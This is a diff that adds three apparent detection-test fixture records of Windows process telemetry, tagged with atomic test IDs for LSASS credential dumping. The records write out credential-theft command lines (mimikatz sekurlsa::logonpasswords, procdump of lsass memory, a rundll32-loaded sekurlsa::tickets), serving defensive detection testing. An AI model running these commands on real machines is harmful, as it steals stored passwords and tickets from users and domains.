@@ -1,0 +1,3 @@
+{"Image":"C:\\Users\\administrator\\Downloads\\mimikatz.exe","CommandLine":"mimikatz.exe \"sekurlsa::logonpasswords\" exit","User":"dc01\\administrator","ParentImage":"C:\\Windows\\System32\\cmd.exe","_atomic_test_id":"T1003.001#mimikatz_logonpasswords"}
+{"Image":"C:\\tools\\procdump.exe","CommandLine":"procdump.exe -ma lsass.exe lsass.dmp","User":"dc01\\administrator","ParentImage":"C:\\Windows\\System32\\cmd.exe","_atomic_test_id":"T1003.001#procdump_lsass"}
+{"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe loader.dll,Run sekurlsa::tickets","User":"dc01\\svc_audit","ParentImage":"C:\\Windows\\System32\\cmd.exe","_atomic_test_id":"T1003.001#sekurlsa_via_rundll32"}
